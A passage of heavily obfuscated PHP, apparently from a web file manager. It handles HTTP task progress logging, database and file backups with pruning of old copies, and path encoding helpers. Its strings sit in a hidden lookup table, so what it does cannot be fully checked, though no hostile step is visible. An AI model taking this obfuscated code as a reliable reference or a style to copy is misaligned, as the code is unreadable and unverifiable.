$fœ¥¡£ŠË÷[$f¶‰¤ÂÙâ[1579]]; if ($E°ŠœåÂÅ == -1) { $E°ŠœåÂÅ = $fœ¥¡£ŠË÷[$f¶‰¤ÂÙâ[1580]]; } if ($BæĞ´âù[$f¶‰¤ÂÙâ[1563]] == $f¶‰¤ÂÙâ[107] && $E°ŠœåÂÅ) { $BæĞ´âù[$f¶‰¤ÂÙâ[1564]] += $E°ŠœåÂÅ; } goto BÍÍ™œéÎì; e³ºÆºõù: } } class TaskHttp extends Task { protected function startAfter() { $Eå©½ÑÅ® =& $_SERVER[ÒÆ›ÆØÎ¾]; $C·Ô¢å‚ªÕ =& $this->task; $C·Ô¢å‚ªÕ[$Eå©½ÑÅ®[1581]] = 1; Hook::bind($Eå©½ÑÅ®[1553], array($this, $Eå©½ÑÅ®[1582])); Hook::bind($Eå©½ÑÅ®[1555], array($this, $Eå©½ÑÅ®[1583])); Hook::bind($Eå©½ÑÅ®[1557], array($this, $Eå©½ÑÅ®[1584])); } protected function endAfter() { $AñÛËğÍ =& $_SERVER[ÒÆ›ÆØÎ¾]; Hook::unbind($AñÛËğÍ[1553], array($this, $AñÛËğÍ[1582])); Hook::unbind($AñÛËğÍ[1555], array($this, $AñÛËğÍ[1583])); Hook::unbind($AñÛËğÍ[1557], array($this, $AñÛËğÍ[1584])); } public function progressStart($dÁÉˆ‚³­±) { $fïîŠæ” =& $_SERVER[ÒÆ›ÆØÎ¾]; $CÀÌÓ‹¯ = curl_getinfo($dÁÉˆ‚³­±); self::log($fïîŠæ”[1585] . $CÀÌÓ‹¯[$fïîŠæ”[305]]); self::valueSet($this->task[$fïîŠæ”[393]], $this->task); } public function progressEnd($a ©µæØ‡’) { $f½‡¿•‚‚ì =& $_SERVER[ÒÆ›ÆØÎ¾]; self::log($f½‡¿•‚‚ì[1586] . $this->task[$f½‡¿•‚‚ì[393]]); $this->end(); } public function progress($D°Ç…¹°ó¯, $EÈ‰¢‹ˆˆ, $bâÄ…Í¸ÒÁ, $aƒ´ñ‰ÆÜº, $c°ÖÎÊ»À) { $Dª®Œ¨¶† =& $_SERVER[ÒÆ›ÆØÎ¾]; $DŸë¦®¸œ° =& $this->task; if ($c°ÖÎÊ»À > 0) { $DŸë¦®¸œ°[$Dª®Œ¨¶†[1012]] = $DŸë¦®¸œ°[$Dª®Œ¨¶†[1012]] == 0 ? $aƒ´ñ‰ÆÜº : $DŸë¦®¸œ°[$Dª®Œ¨¶†[1012]]; $DŸë¦®¸œ°[$Dª®Œ¨¶†[1027]] = $c°ÖÎÊ»À; } else { if ($bâÄ…Í¸ÒÁ > 0) { $DŸë¦®¸œ°[$Dª®Œ¨¶†[1012]] = $DŸë¦®¸œ°[$Dª®Œ¨¶†[1012]] == 0 ? $EÈ‰¢‹ˆˆ : $DŸë¦®¸œ°[$Dª®Œ¨¶†[1012]]; $DŸë¦®¸œ°[$Dª®Œ¨¶†[1027]] = $bâÄ…Í¸ÒÁ; } } $this->update(); self::log("\160\x72\157\x67\162\x65\163\163\x48\x74\164\x70\72\x64\157\167\156\72{$bâÄ…Í¸ÒÁ}\57{$EÈ‰¢‹ˆˆ}\x3b\x20\165\x70\154\157\141\x64\72{$c°ÖÎÊ»À}\57{$aƒ´ñ‰ÆÜº}\x3b"); } } goto a†¾Á‡µ¾; eİÆÛß¢Êê: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $c¼“õ›‚…— =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->isManual(); self::$name = date($c¼“õ›‚…—[700]); if (!($A«‰°¡ëè = Model($c¼“õ›‚…—[701])->lastItem())) { $A«‰°¡ëè = $this->initData(); } else { self::$name = $A«‰°¡ëè[$c¼“õ›‚…—[28]]; if ($A«‰°¡ëè[$c¼“õ›‚…—[702]] == $c¼“õ›‚…—[87]) { self::$name = date($c¼“õ›‚…—[703]); $cÇùÉô”„› = 0; if (isset($A«‰°¡ëè[$c¼“õ›‚…—[291]][$c¼“õ›‚…—[193]][$c¼“õ›‚…—[447]])) { $cÇùÉô”„› = (int) $A«‰°¡ëè[$c¼“õ›‚…—[291]][$c¼“õ›‚…—[193]][$c¼“õ›‚…—[447]]; } if (self::$manual == 0 && $A«‰°¡ëè[$c¼“õ›‚…—[28]] == self::$name) { Model($c¼“õ›‚…—[701])->remove($A«‰°¡ëè[$c¼“õ›‚…—[393]]); } $A«‰°¡ëè = $this->initData($cÇùÉô”„›, $A«‰°¡ëè[$c¼“õ›‚…—[704]]); } else { $this->checkStore($A«‰°¡ëè[$c¼“õ›‚…—[704]]); } } self::$option = $A«‰°¡ëè; } private function isManual() { $a™Á¼èÅ¨… = _get($GLOBALS, $_SERVER[ÒÆ›ÆØÎ¾][705], 0); $a™Á¼èÅ¨… = intval($a™Á¼èÅ¨…); self::$manual = $a™Á¼èÅ¨… && $a™Á¼èÅ¨… == 1 ? 1 : 0; } private function initData($A¸’Ÿ‹Ë– = 0, $F½£›ÅÙí = '') { goto e†¢„ªŒ‰²; A«”šôóÄ’: $E¼ï¤ÊÊ¥Ó = Model($B½°ÃÚÜ’[701])->insert($c¼ö¬ƒË³¬); $c¼ö¬ƒË³¬[$B½°ÃÚÜ’[393]] = $E¼ï¤ÊÊ¥Ó; return $c¼ö¬ƒË³¬; goto dÉØÈ—ØÈ; e†¢„ªŒ‰²: $B½°ÃÚÜ’ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bªëÛ§ÊŒ– = Model($B½°ÃÚÜ’[701])->config(); if ($F½£›ÅÙí && $bªëÛ§ÊŒ–[$B½°ÃÚÜ’[704]] != $F½£›ÅÙí) { $A¸’Ÿ‹Ë– = 0; } goto Aôó¥Ï¨¯ô; Aôó¥Ï¨¯ô: $this->checkStore($bªëÛ§ÊŒ–[$B½°ÃÚÜ’[704]]); if (self::$manual == 1) { self::$name .= $B½°ÃÚÜ’[71] . date($B½°ÃÚÜ’[706]); } $c¼ö¬ƒË³¬ = array($B½°ÃÚÜ’[704] => $bªëÛ§ÊŒ–[$B½°ÃÚÜ’[704]], $B½°ÃÚÜ’[28] => self::$name, $B½°ÃÚÜ’[702] => 0, $B½°ÃÚÜ’[707] => $bªëÛ§ÊŒ–[$B½°ÃÚÜ’[707]], $B½°ÃÚÜ’[708] => self::$manual, $B½°ÃÚÜ’[291] => array($B½°ÃÚÜ’[709] => array($B½°ÃÚÜ’[702] => 0), $B½°ÃÚÜ’[710] => array($B½°ÃÚÜ’[702] => 0, $B½°ÃÚÜ’[711] => 0, $B½°ÃÚÜ’[712] => 0, $B½°ÃÚÜ’[29] => $B½°ÃÚÜ’[33], $B½°ÃÚÜ’[713] => 0, $B½°ÃÚÜ’[476] => 0), $B½°ÃÚÜ’[714] => array($B½°ÃÚÜ’[702] => 0, $B½°ÃÚÜ’[711] => 0, $B½°ÃÚÜ’[712] => 0, $B½°ÃÚÜ’[713] => 0, $B½°ÃÚÜ’[476] => 0), $B½°ÃÚÜ’[193] => array($B½°ÃÚÜ’[702] => 0, $B½°ÃÚÜ’[715] => 0, $B½°ÃÚÜ’[716] => 0, $B½°ÃÚÜ’[717] => 0, $B½°ÃÚÜ’[718] => 0, $B½°ÃÚÜ’[447] => $A¸’Ÿ‹Ë–, $B½°ÃÚÜ’[713] => 0, $B½°ÃÚÜ’[476] => 0)), $B½°ÃÚÜ’[713] => time(), $B½°ÃÚÜ’[476] => 0); goto A«”šôóÄ’; dÉØÈ—ØÈ: } private function checkStore($DÀ¸ ŠËŒÖ) { $bÂòÀ‘¢èŠ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E¸Ñ—°ò±Ì = Model($bÂòÀ‘¢èŠ[719])->listData($DÀ¸ ŠËŒÖ); Model($bÂòÀ‘¢èŠ[719])->checkConfig($E¸Ñ—°ò±Ì); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ÒÆ›ÆØÎ¾][701])->findByName(self::$name); } return self::$option; } public static function set($EãÔë…çíÀ) { $FÀ ’èƒ° =& $_SERVER[ÒÆ›ÆØÎ¾]; $fšÀ³Å£Êˆ = self::get(); foreach ($EãÔë…çíÀ as $EŸá¡áàëò => $E®•Î˜Ø„) { $Cö˜ç®†‘  = explode($FÀ ’èƒ°[95], $EŸá¡áàëò); $dĞñÌê“½ö = count($Cö˜ç®†‘ ); switch ($dĞñÌê“½ö) { case 1: $fšÀ³Å£Êˆ[$Cö˜ç®†‘ [0]] = $E®•Î˜Ø„; break; case 2: $fšÀ³Å£Êˆ[$Cö˜ç®†‘ [0]][$Cö˜ç®†‘ [1]] = $E®•Î˜Ø„; break; case 3: $fšÀ³Å£Êˆ[$Cö˜ç®†‘ [0]][$Cö˜ç®†‘ [1]][$Cö˜ç®†‘ [2]] = $E®•Î˜Ø„; break; } } Model($FÀ ’èƒ°[701])->update($fšÀ³Å£Êˆ[$FÀ ’èƒ°[393]], $fšÀ³Å£Êˆ); self::$option = $fšÀ³Å£Êˆ; return self::$option; } public function keep() { $e½‘Áõœˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; $FîµŠ§£© = self::get(); if ($FîµŠ§£©[$e½‘Áõœˆ[291]][$e½‘Áõœˆ[709]][$e½‘Áõœˆ[702]] == $e½‘Áõœˆ[87]) { return; } $this->backupKeep($FîµŠ§£©); self::set(array($e½‘Áõœˆ[720] => 1)); } private function backupKeep($eõÌ¯Ş¹›å) { goto CƒÕ®Æ¶Ğ; BÌ›È¥„–: if (empty($aÑ˜ÉéÂç¬)) { return; } $C¹Î½× ƒ• = 0; $aæß‚•¤éÅ = array(); goto e¼ã…»Áçæ; CƒÕ®Æ¶Ğ: $e‡ ²šãÔğ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (self::$manual == 1) { return; } $aÑ˜ÉéÂç¬ = Model($e‡ ²šãÔğ[701])->listData(); goto BÌ›È¥„–; fäòŠâÉ¯…: $d­êÇÚÓ„° = Model($e‡ ²šãÔğ[722])->get($e‡ ²šãÔğ[723]); foreach ($aÑ˜ÉéÂç¬ as $dÉåŠˆ§ïİ) { if (isset($dÉåŠˆ§ïİ[$e‡ ²šãÔğ[708]]) && $dÉåŠˆ§ïİ[$e‡ ²šãÔğ[708]] == $e‡ ²šãÔğ[87]) { continue; } if (!empty($dÉåŠˆ§ïİ[$e‡ ²šãÔğ[28]]) && in_array($dÉåŠˆ§ïİ[$e‡ ²šãÔğ[28]], $aæß‚•¤éÅ)) { continue; } Model($e‡ ²šãÔğ[701])->remove($dÉåŠˆ§ïİ[$e‡ ²šãÔğ[393]]); $eƒ²Ø²”˜‰ = $this->backupPath($eõÌ¯Ş¹›å, $d­êÇÚÓ„°); IO::remove($eƒ²Ø²”˜‰, !1); } goto Fªá™â˜; e¼ã…»Áçæ: foreach ($aÑ˜ÉéÂç¬ as $dÉåŠˆ§ïİ) { if ($C¹Î½× ƒ• >= 7) { break; } $aæß‚•¤éÅ[] = $dÉåŠˆ§ïİ[$e‡ ²šãÔğ[28]]; $C¹Î½× ƒ•++; } for ($C¹Î½× ƒ• = 0; $C¹Î½× ƒ• < 12; $C¹Î½× ƒ•++) { $aæß‚•¤éÅ[] = date($e‡ ²šãÔğ[721], strtotime("\55{$C¹Î½× ƒ•}\x20\x6d\157\x6e\x74\x68\163")); } $aæß‚•¤éÅ = array_unique($aæß‚•¤éÅ); goto fäòŠâÉ¯…; Fªá™â˜: } private function backupPath($eÖÖ“Í¥Ë†, $fÀ®¹¬ôÔ† = false) { $bŸ”Û¦÷‹ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$fÀ®¹¬ôÔ†) { $fÀ®¹¬ôÔ† = Model($bŸ”Û¦÷‹[722])->get($bŸ”Û¦÷‹[723]); } $eĞ½ˆ˜Ÿ•… = $eÖÖ“Í¥Ë†[$bŸ”Û¦÷‹[28]]; $CæÈôŸÊÇ = substr(md5($bŸ”Û¦÷‹[724] . $fÀ®¹¬ôÔ† . $eĞ½ˆ˜Ÿ•…), 0, 8); return "\173\151\x6f\72{$eÖÖ“Í¥Ë†[$bŸ”Û¦÷‹[704]]}\175\57\x64\x61\164\141\142\141\x73\145\x2f\x62\141\x63\x6b\x75\x70\x2f" . $eĞ½ˆ˜Ÿ•… . $bŸ”Û¦÷‹[71] . $CæÈôŸÊÇ; } public function db() { goto a¬‡¥ù³£å; E†°æù«™: return !0; goto FâÍï¿÷ì‘; a¬‡¥ù³£å: $aí¢™“±Ø =& $_SERVER[ÒÆ›ÆØÎ¾]; $cÌ‹øçŒ‰ß = self::get(); if ($cÌ‹øçŒ‰ß[$aí¢™“±Ø[291]][$aí¢™“±Ø[710]][$aí¢™“±Ø[702]] == $aí¢™“±Ø[87]) { return !0; } goto bœîõ¥¾‚¦; bœîõ¥¾‚¦: $BÅÜÀ¯ÓÂ = new BackupDb(); if (!$BÅÜÀ¯ÓÂ->index()) { return !1; } self::set(array($aí¢™“±Ø[725] => 1)); goto E†°æù«™; FâÍï¿÷ì‘: } public function dbFile() { goto DÜÏä¥Úˆê; DÜÏä¥Úˆê: $bÁ¨ŒçĞ©¹ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D¯ÉÔ¼Ÿœ‰ = self::get(); if ($D¯ÉÔ¼Ÿœ‰[$bÁ¨ŒçĞ©¹[291]][$bÁ¨ŒçĞ©¹[714]][$bÁ¨ŒçĞ©¹[702]] == $bÁ¨ŒçĞ©¹[87]) { return !0; } goto e½³ˆæß„Ñ; e½³ˆæß„Ñ: $bÓÑôâÍ = new BackupDbFile(); if (!$bÓÑôâÍ->index()) { return !1; } self::set(array($bÁ¨ŒçĞ©¹[726] => 1)); goto b³ƒƒè¾Öê; b³ƒƒè¾Öê: return !0; goto Fª¼³ÇÔÚ; Fª¼³ÇÔÚ: } public function file() { $DÏ‘•™È»é =& $_SERVER[ÒÆ›ÆØÎ¾]; $dÕ¨øßö– = self::get(); if ($dÕ¨øßö–[$DÏ‘•™È»é[291]][$DÏ‘•™È»é[193]][$DÏ‘•™È»é[702]] == $DÏ‘•™È»é[87]) { return !0; } if (!isset($dÕ¨øßö–[$DÏ‘•™È»é[707]]) || $dÕ¨øßö–[$DÏ‘•™È»é[707]] == $DÏ‘•™È»é[191]) { $dÅº¥÷‰¤Ï = new BackupFile(); if (!$dÅº¥÷‰¤Ï->index()) { return !1; } } self::set(array($DÏ‘•™È»é[727] => 1, $DÏ‘•™È»é[702] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto c¯£ºÛ’®§; B×Ñ¡ŠŠßŠ: $d‹¸îŞòƒ– = $CˆïáØÂÌ× = 0; try { $FÏîÜ´‹îó = $DÍ£†ÖÁ±Œ->db()->getTables(); } catch (Exception $a¬™ÅâÏƒá) { return !1; } $FÏîÜ´‹îó = array_diff($FÏîÜ´‹îó, array($bÒŞê ¸˜Î[731], $bÒŞê ¸˜Î[732])); goto F¿ù¢øã‘Ò; c¯£ºÛ’®§: $bÒŞê ¸˜Î =& $_SERVER[ÒÆ›ÆØÎ¾]; $d‰¤»ğÏ„ = Backup::get(); self::$io = $d‰¤»ğÏ„[$bÒŞê ¸˜Î[704]]; goto c×²šÄØë; cµÍâ›ŠöĞ: $FÁÔ¤ÖŒ‡ë = $this->tmpFilesPath() . $bÒŞê ¸˜Î[730] . self::$name . $bÒŞê ¸˜Î[8]; del_dir($FÁÔ¤ÖŒ‡ë); mk_dir($FÁÔ¤ÖŒ‡ë); goto B×Ñ¡ŠŠßŠ; AçÍ¬Ÿô¸ˆ: if (isset($aÒ††Â§îğ->task[$bÒŞê ¸˜Î[740]])) { $bƒï¤ŞõÖ = $aÒ††Â§îğ->task[$bÒŞê ¸˜Î[740]] ? $aÒ††Â§îğ->task[$bÒŞê ¸˜Î[740]] : timeFloat(); $A½á…›Õí· = $bƒï¤ŞõÖ - $aÒ††Â§îğ->task[$bÒŞê ¸˜Î[741]]; if ($A½á…›Õí· >= 0.2) { $d‹¸îŞòƒ– += 1; } } $aÒ††Â§îğ->end(); $C¸»›¡òÖÜ = array($bÒŞê ¸˜Î[728] => $FÄĞæ‰ğ²˜, $bÒŞê ¸˜Î[725] => 1, $bÒŞê ¸˜Î[742] => $d‹¸îŞòƒ–, $bÒŞê ¸˜Î[743] => $CˆïáØÂÌ×, $bÒŞê ¸˜Î[744] => time()); goto BŠ‚©èÇ¢; c×²šÄØë: self::$name = $d‰¤»ğÏ„[$bÒŞê ¸˜Î[28]]; $dÓ¼•³ = $GLOBALS[$bÒŞê ¸˜Î[6]][$bÒŞê ¸˜Î[17]]; $FÄĞæ‰ğ²˜ = $this->_dbType($dÓ¼•³); goto f…òÍÅœ´ˆ; BŠ‚©èÇ¢: Backup::set($C¸»›¡òÖÜ); if ($d‹¸îŞòƒ– > $CˆïáØÂÌ×) { write_log(array($bÒŞê ¸˜Î[745], $C¸»›¡òÖÜ), $bÒŞê ¸˜Î[734]); return !1; } return !0; goto b¶Ûœ‰ÄÙ; F¿ù¢øã‘Ò: foreach ($FÏîÜ´‹îó as $c‚ì°ÀÅ¸Ë) { $d‹¸îŞòƒ– += $DÍ£†ÖÁ±Œ->model($c‚ì°ÀÅ¸Ë)->count(); } $aÒ††Â§îğ = new Task($bÒŞê ¸˜Î[733], $bÒŞê ¸˜Î[734], $d‹¸îŞòƒ–, LNG($bÒŞê ¸˜Î[735]) . $bÒŞê ¸˜Î[736] . LNG($bÒŞê ¸˜Î[737])); foreach ($FÏîÜ´‹îó as $c‚ì°ÀÅ¸Ë) { $eäÄÂß Øé = $FÁÔ¤ÖŒ‡ë . $c‚ì°ÀÅ¸Ë . $bÒŞê ¸˜Î[738]; $AŠ¼ŞÃî…Ó = null; if ($c‚ì°ÀÅ¸Ë == $bÒŞê ¸˜Î[739] && (!isset($d‰¤»ğÏ„[$bÒŞê ¸˜Î[707]]) || $d‰¤»ğÏ„[$bÒŞê ¸˜Î[707]] == $bÒŞê ¸˜Î[191])) { $AŠ¼ŞÃî…Ó = self::$io; } $CˆïáØÂÌ× += $DÍ£†ÖÁ±Œ->sqlFromDb($c‚ì°ÀÅ¸Ë, $eäÄÂß Øé, $aÒ††Â§îğ, $AŠ¼ŞÃî…Ó); } goto AçÍ¬Ÿô¸ˆ; f…òÍÅœ´ˆ: $DÍ£†ÖÁ±Œ = new DbManage($dÓ¼•³, $FÄĞæ‰ğ²˜); $C¸»›¡òÖÜ = array($bÒŞê ¸˜Î[728] => $FÄĞæ‰ğ²˜, $bÒŞê ¸˜Î[729] => time()); Backup::set($C¸»›¡òÖÜ); goto cµÍâ›ŠöĞ; b¶Ûœ‰ÄÙ: } private function _dbType($d ÕÂ»¤–) { goto D¿øºìÅğƒ; Aî’ó¶¸¸Ì: return $e‡¼á³¯; goto B‰¶¦ß»‚; D¿øºìÅğƒ: $eÊêÓš±Àã =& $_SERVER[ÒÆ›ÆØÎ¾]; $d ÕÂ»¤– = array_change_key_case($d ÕÂ»¤–); $e‡¼á³¯ = $d ÕÂ»¤–[$eÊêÓš±Àã[746]]; goto AõóŒ‘³¡á; AõóŒ‘³¡á: if ($e‡¼á³¯ == $eÊêÓš±Àã[747]) { $F‹¤ŸñùŸ¢ = explode($eÊêÓš±Àã[4], $d ÕÂ»¤–[$eÊêÓš±Àã[748]]); $e‡¼á³¯ = $F‹¤ŸñùŸ¢[0]; } $c¨©ÒŸ´…à = array($eÊêÓš±Àã[749] => $eÊêÓš±Àã[9], $eÊêÓš±Àã[750] => $eÊêÓš±Àã[751]); if (isset($c¨©ÒŸ´…à[$e‡¼á³¯])) { $e‡¼á³¯ = $c¨©ÒŸ´…à[$e‡¼á³¯]; } goto Aî’ó¶¸¸Ì; B‰¶¦ß»‚: } private function tmpFilesPath() { $B ”ëÇ”Œ¶ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Fêõ˜¾¿°… = TEMP_FILES; if ($GLOBALS[$B ”ëÇ”Œ¶[6]][$B ”ëÇ”Œ¶[88]][$B ”ëÇ”Œ¶[752]]) { $Fêõ˜¾¿°… = $GLOBALS[$B ”ëÇ”Œ¶[6]][$B ”ëÇ”Œ¶[88]][$B ”ëÇ”Œ¶[752]]; if (!mk_dir($Fêõ˜¾¿°…) || !is_writable($Fêõ˜¾¿°…) || !IO::mkfile($Fêõ˜¾¿°… . $B ”ëÇ”Œ¶[753])) { $Fêõ˜¾¿°… = TEMP_FILES; } } return $Fêõ˜¾¿°…; } } class BackupDbFile { public function __construct() { } public function index() { goto FŞ‚­ÙÌ ; f¹¾å­: $Aö­„‚ÜÜÛ = $this->tmpFilesPath() . "\142\x61\143\x6b\x75\x70\x5f{$aéçŞ’ù ï}\x2f"; $Bôíã‚‡Ù³ = $this->backupPath($AôÆŸŸÁƒŞ); if (!($Bôíã‚‡Ù³ = IO::mkdir($Bôíã‚‡Ù³))) { return !1; } goto B³Ô­ãÊ¦ñ; D‹öõ¢†›¼: IO::copy($cŸå§ã™õô, $Bôíã‚‡Ù³); $CÇ¸¬ÏóÑ›->end(); $fâó²İ—Í¨ = array($BÜ£Ş¶­[762] => $BÎîÓÅã¹¡, $BÜ£Ş¶­[763] => time()); goto d‹‡ÇÃ †¬; FŞ‚­ÙÌ : $BÜ£Ş¶­ =& $_SERVER[ÒÆ›ÆØÎ¾]; $AôÆŸŸÁƒŞ = Backup::get(); $aéçŞ’ù ï = $AôÆŸŸÁƒŞ[$BÜ£Ş¶­[28]]; goto f¹¾å­; C±´ô°…Æ¥: if (!$BÎîÓÅã¹¡) { return !1; } $fâó²İ—Í¨ = array($BÜ£Ş¶­[754] => $BÎîÓÅã¹¡, $BÜ£Ş¶­[755] => time()); Backup::set($fâó²İ—Í¨); goto B ”©‰å; d‹‡ÇÃ †¬: Backup::set($fâó²İ—Í¨); return !0; goto DËË½Ş…ä­; B³Ô­ãÊ¦ñ: $fé‰²Û„ó× = IO::listPath($Aö­„‚ÜÜÛ); $AøîÜÕŸÒ = isset($fé‰²Û„ó×[$BÜ£Ş¶­[74]]) ? $fé‰²Û„ó×[$BÜ£Ş¶­[74]] : array(); $BÎîÓÅã¹¡ = array_sum(array_column($AøîÜÕŸÒ, $BÜ£Ş¶­[78])); goto C±´ô°…Æ¥; B ”©‰å: $CÇ¸¬ÏóÑ› = new TaskFileTransfer($BÜ£Ş¶­[756], $BÜ£Ş¶­[734], count($AøîÜÕŸÒ), LNG($BÜ£Ş¶­[735]) . $BÜ£Ş¶­[440] . LNG($BÜ£Ş¶­[737]) . $BÜ£Ş¶­[757]); $CÇ¸¬ÏóÑ›->task[$BÜ£Ş¶­[715]] = $BÎîÓÅã¹¡; foreach ($fé‰²Û„ó×[$BÜ£Ş¶­[74]] as $E‰²‚•Ôøø) { $aµÑÚãßœ = IO::move($E‰²‚•Ôøø[$BÜ£Ş¶­[76]], $Bôíã‚‡Ù³); if (!$aµÑÚãßœ) { $CÇ¸¬ÏóÑ›->end(); $c¬ºÈ¹§Ø© = IO::getLastError($BÜ£Ş¶­[758] . $E‰²‚•Ôøø[$BÜ£Ş¶­[76]] . $BÜ£Ş¶­[759] . $Bôíã‚‡Ù³ . $BÜ£Ş¶­[504]); write_log($c¬ºÈ¹§Ø©, $BÜ£Ş¶­[734]); return !1; } } goto E˜Ã¥®É¥ö; E˜Ã¥®É¥ö: $eù¼™‘ÖÅ‰ = CONTROLLER_DIR . $BÜ£Ş¶­[760]; $cŸå§ã™õô = CONTROLLER_DIR . $BÜ£Ş¶­[761]; IO::copy($eù¼™‘ÖÅ‰, $Bôíã‚‡Ù³); goto D‹öõ¢†›¼; DËË½Ş…ä­: } private function backupPath($DÌ‰«±ä­) { $Eë—ñ‡ğê‚ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Eµï­Œ¹­æ = $DÌ‰«±ä­[$Eë—ñ‡ğê‚[28]]; $f­¦Îè¼‚ = Model($Eë—ñ‡ğê‚[722])->get($Eë—ñ‡ğê‚[723]); $fá×òÌÙÆ· = substr(md5($Eë—ñ‡ğê‚[724] . $f­¦Îè¼‚ . $Eµï­Œ¹­æ), 0, 8); return "\173\x69\157\72{$DÌ‰«±ä­[$Eë—ñ‡ğê‚[704]]}\x7d\57\144\x61\x74\141\x62\x61\x73\145\57\142\x61\143\x6b\165\x70\x2f" . $Eµï­Œ¹­æ . $Eë—ñ‡ğê‚[71] . $fá×òÌÙÆ·; } private function tmpFilesPath() { $f­æ¡öí¢ =& $_SERVER[ÒÆ›ÆØÎ¾]; $C¿ÜÎÄ×«À = TEMP_FILES; if ($GLOBALS[$f­æ¡öí¢[6]][$f­æ¡öí¢[88]][$f­æ¡öí¢[752]]) { $C¿ÜÎÄ×«À = $GLOBALS[$f­æ¡öí¢[6]][$f­æ¡öí¢[88]][$f­æ¡öí¢[752]]; if (!mk_dir($C¿ÜÎÄ×«À) || !is_writable($C¿ÜÎÄ×«À) || !IO::mkfile($C¿ÜÎÄ×«À . $f­æ¡öí¢[753])) { $C¿ÜÎÄ×«À = TEMP_FILES; } } return $C¿ÜÎÄ×«À; } } goto fÏ÷¶ø‡ÎÀ; dÀ²”Ò†£Á: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $D¹£¥¸ù½» =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->objectDriver = array($D¹£¥¸ù½»[57], $D¹£¥¸ù½»[58], $D¹£¥¸ù½»[59], $D¹£¥¸ù½»[60], $D¹£¥¸ù½»[61], $D¹£¥¸ù½»[62], $D¹£¥¸ù½»[63], $D¹£¥¸ù½»[64], $D¹£¥¸ù½»[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($d«ÌÑ¦ˆ¦‰) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($d«ÌÑ¦ˆ¦‰, $_SERVER[ÒÆ›ÆØÎ¾][8]); } return $d«ÌÑ¦ˆ¦‰; } public function iconvApp($E³è‡‰°²) { return $E³è‡‰°²; } public function iconvSystem($d³ªŠò»¬Ñ) { return $d³ªŠò»¬Ñ; } public function iconvTo($E÷ºŞåòôƒ, $Cà½Òñğ¬Å, $fœÌªàø©ë) { goto EÇçí×óáç; A¾“Æƒ : $aô¢ö ÷‹ô = $Cà½Òñğ¬Å . $D¨ˆ•İ³Ï[67] . $fœÌªàø©ë . $D¨ˆ•İ³Ï[68] . $E÷ºŞåòôƒ; if (isset($Eõê£šÌÊí[$aô¢ö ÷‹ô])) { return $Eõê£šÌÊí[$aô¢ö ÷‹ô]; } if (function_exists($D¨ˆ•İ³Ï[69])) { $c “Ìßä’É = @mb_convert_encoding($E÷ºŞåòôƒ, $fœÌªàø©ë, $Cà½Òñğ¬Å); } else { $c “Ìßä’É = @iconv($Cà½Òñğ¬Å, $fœÌªàø©ë, $E÷ºŞåòôƒ); } goto d‚‡Ş¨¶ÂŒ; EÇçí×óáç: $D¨ˆ•İ³Ï =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$E÷ºŞåòôƒ || !function_exists($D¨ˆ•İ³Ï[66])) { return $E÷ºŞåòôƒ; } static $Eõê£šÌÊí = array(); goto A¾“Æƒ ; d‚‡Ş¨¶ÂŒ: $c “Ìßä’É = $c “Ìßä’É ? $c “Ìßä’É : $E÷ºŞåòôƒ; if (strstr($c “Ìßä’É, $D¨ˆ•İ³Ï[70])) { $c “Ìßä’É = str_replace($D¨ˆ•İ³Ï[70], $D¨ˆ•İ³Ï[71], $c “Ìßä’É); } $Eõê£šÌÊí[$Cà½Òñğ¬Å . $D¨ˆ•İ³Ï[67] . $fœÌªàø©ë . $D¨ˆ•İ³Ï[68] . $E÷ºŞåòôƒ] = $c “Ìßä’É; goto A†–Õ¼à×; A†–Õ¼à×: $Eõê£šÌÊí[$fœÌªàø©ë . $D¨ˆ•İ³Ï[67] . $Cà½Òñğ¬Å . $D¨ˆ•İ³Ï[68] . $E÷ºŞåòôƒ] = $E÷ºŞåòôƒ; $Eõê£šÌÊí[$fœÌªàø©ë . $D¨ˆ•İ³Ï[67] . $Cà½Òñğ¬Å . $D¨ˆ•İ³Ï[68] . $c “Ìßä’É] = $E÷ºŞåòôƒ; $Eõê£šÌÊí[$Cà½Òñğ¬Å . $D¨ˆ•İ³Ï[67] . $fœÌªàø©ë . $D¨ˆ•İ³Ï[68] . $c “Ìßä’É] = $c “Ìßä’É; goto fÍÙÙ·•Èø; fÍÙÙ·•Èø: return $c “Ìßä’É; goto A«½“„ˆí¬; A«½“„ˆí¬: } public function getPathInner($F²Ÿ›ÜäË¸) { $Fé¿ÜµÉ½ô = IO::init($F²Ÿ›ÜäË¸); return $Fé¿ÜµÉ½ô->path; } public function getPathOuter($eÚ‹·¯‘ôÓ) { $aËµ©Ëã‹Š =& $_SERVER[ÒÆ›ÆØÎ¾]; $F®ÄéÔ¸— = strlen(trim($this->pathBase, $aËµ©Ëã‹Š[8])); $eÚ‹·¯‘ôÓ = substr(trim($eÚ‹·¯‘ôÓ, $aËµ©Ëã‹Š[8]), $F®ÄéÔ¸—); return $this->pathDriver . $aËµ©Ëã‹Š[8] . ltrim($eÚ‹·¯‘ôÓ, $aËµ©Ëã‹Š[8]); } public function isParentOf($d‹”­œÔ, $FŒßÔ°°¯Å) { $C†Éñ³›éå =& $_SERVER[ÒÆ›ÆØÎ¾]; $d‹”­œÔ = rtrim(strtolower($d‹”­œÔ), $C†Éñ³›éå[8]) . $C†Éñ³›éå[8]; $FŒßÔ°°¯Å = rtrim(strtolower($FŒßÔ°°¯Å), $C†Éñ³›éå[8]) . $C†Éñ³›éå[8]; $bÜ™ç‡ƒ’© = strpos($FŒßÔ°°¯Å, $d‹”­œÔ) === 0; return $bÜ™ç‡ƒ’©; } public function getType() { $A„Ö°Á”½ƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $c Ã²‹µ¼ñ = 